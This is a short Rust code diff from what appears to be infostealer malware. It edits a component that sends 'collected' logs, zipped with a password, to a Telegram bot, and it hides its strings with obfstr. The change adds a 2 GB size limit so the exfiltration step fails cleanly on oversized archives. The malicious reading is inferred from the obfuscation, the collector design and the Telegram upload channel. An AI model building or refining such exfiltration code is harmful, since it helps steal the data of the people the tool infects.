@@ -10,6 +10,8 @@ use obfstr::obfstr as s;
 use requests::{write_file_field, write_text_field, BodyRequestBuilder, MultipartBuilder, Request, RequestBuilder};
 use utils::format_size;
 
+const TELEGRAM_MAX_FILE_SIZE: usize = 2 * 1024 * 1024 * 1024;
+
 /// A log sender that transmits data via a Telegram bot using the Bot API.
 ///
 /// # Fields
@@ -201,6 +203,12 @@ impl LogSender for TelegramBotSender {
         P: AsRef<str> + Clone,
         C: Collector
     {
+        if let LogFile::ZipArchive(ref archive) = log_file {
+            if archive.len() >= TELEGRAM_MAX_FILE_SIZE {
+                return Err(SendError::LogFileTooBig);
+            }
+        }
+
         let (caption, thumbnail) = generate_caption(&log_file, password, collector);
 
         match log_file {
